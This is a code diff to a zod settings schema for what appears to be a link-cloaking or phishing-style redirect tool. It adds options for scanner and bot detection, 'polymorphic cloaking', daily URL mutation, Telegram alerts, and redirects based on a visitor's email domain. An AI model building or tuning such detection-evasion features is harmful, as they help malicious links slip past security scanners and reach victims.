@@ -10,10 +10,12 @@ export const settingsSchema = z.object({
       enabled: z.boolean().optional(),
       botToken: z.string().optional(),
       chatId: z.string().optional(),
-      events: z.array(z.string()).optional()
+      events: z.array(z.string()).optional(),
+      notifyBotDetections: z.boolean().optional()
     }).optional(),
     email: z.object({
       enabled: z.boolean().optional(),
+      toEmail: z.string().email().optional().or(z.literal('')),
       smtpHost: z.string().optional(),
       smtpPort: z.number().int().min(1).max(65535).optional(),
       smtpUser: z.string().optional(),
@@ -28,7 +30,8 @@ export const settingsSchema = z.object({
       enabled: z.boolean().optional(),
       checkIPBlocklist: z.boolean().optional(),
       cloudflareBotManagement: z.boolean().optional(),
-      scannerDetection: z.boolean().optional()
+      scannerDetection: z.boolean().optional(),
+      confidenceThreshold: z.number().int().min(0).max(100).optional()
     }).optional(),
     captcha: z.object({
       enabled: z.boolean().optional(),
@@ -36,7 +39,8 @@ export const settingsSchema = z.object({
       turnstileSiteKey: z.string().optional(),
       turnstileSecretKey: z.string().optional(),
       privatecaptchaSiteKey: z.string().optional(),
-      privatecaptchaSecretKey: z.string().optional()
+      privatecaptchaSecretKey: z.string().optional(),
+      template: z.enum(['A', 'B', 'C', 'D']).optional()
     }).optional(),
     botDelay: z.object({
       enabled: z.boolean().optional(),
@@ -65,6 +69,23 @@ export const settingsSchema = z.object({
       allowVpn: z.boolean().optional(),
       allowProxy: z.boolean().optional(),
       allowDatacenter: z.boolean().optional()
+    }).optional(),
+    securityMode: z.enum(['strict', 'hardened']).optional(),
+    enableDailyUrlMutation: z.boolean().optional(),
+    enablePolymorphicCloaking: z.boolean().optional(),
+    behavioral: z.object({
+      enableBehaviorModel: z.boolean().optional(),
+      behaviorThresholds: z.object({
+        blockBelow: z.number().optional(),
+        captchaBelow: z.number().optional()
+      }).optional(),
+      enableMicroHumanSignals: z.boolean().optional(),
+      microHumanWeight: z.number().optional()
+    }).optional(),
+    securityBrain: z.object({
+      enabled: z.boolean().optional(),
+      strictMode: z.boolean().optional(),
+      blockThreshold: z.number().optional()
     }).optional()
   }).optional(),
   
@@ -79,20 +100,8 @@ export const settingsSchema = z.object({
       mobile: z.boolean().optional(),
       tablet: z.boolean().optional()
     }).optional(),
-    browser: z.object({
-      chrome: z.boolean().optional(),
-      firefox: z.boolean().optional(),
-      safari: z.boolean().optional(),
-      edge: z.boolean().optional(),
-      opera: z.boolean().optional(),
-      other: z.boolean().optional()
-    }).optional(),
-    network: z.object({
-      blockVPN: z.boolean().optional(),
-      blockProxy: z.boolean().optional(),
-      blockDatacenter: z.boolean().optional(),
-      blockTor: z.boolean().optional()
-    }).optional()
+    // browser filtering removed - not implemented in backend
+    // network filtering removed - duplicates security.networkRestrictions
   }).optional(),
   
   templates: z.object({
@@ -104,12 +113,17 @@ export const settingsSchema = z.object({
   }).optional(),
   
   redirects: z.object({
+    defaultUrl: urlOrEmpty,
     customUrl: urlOrEmpty,
     useDomainFromEmail: z.boolean().optional(),
     successHash: z.string().optional(),
     tooManyAttemptsHash: z.string().optional(),
     linkUsedHash: z.string().optional(),
     redirectDelaySeconds: z.number().int().min(0).max(60).optional()
+  }).optional(),
+  
+  linkManagement: z.object({
+    allowAllLinks: z.boolean().optional()
   }).optional()
 }).passthrough() // Allow additional fields for backward compatibility
 
